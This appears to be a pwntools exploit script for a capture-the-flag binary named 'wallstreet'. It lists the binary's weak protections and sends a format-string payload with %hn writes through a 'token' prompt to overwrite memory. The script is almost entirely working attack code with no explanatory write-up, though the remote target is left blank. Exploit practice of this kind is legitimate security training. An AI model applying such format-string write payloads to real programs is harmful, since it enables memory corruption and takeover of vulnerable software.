#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template wallstreet
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('wallstreet')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote('', 123)

    p = process([exe.path] + argv, *a, **kw)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)

    return p

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


# for i in range(100):
io = start()
inp = '%58328c%51$hnZ%78$hn'

io.sendlineafter('stonks!\n', str(1))
io.sendlineafter('see?\n', str(1))
io.sendlineafter('token?\n', inp)
io.recvuntil('token:\n', drop=True)
res = io.recvline()
print(res)

# io.interactive()
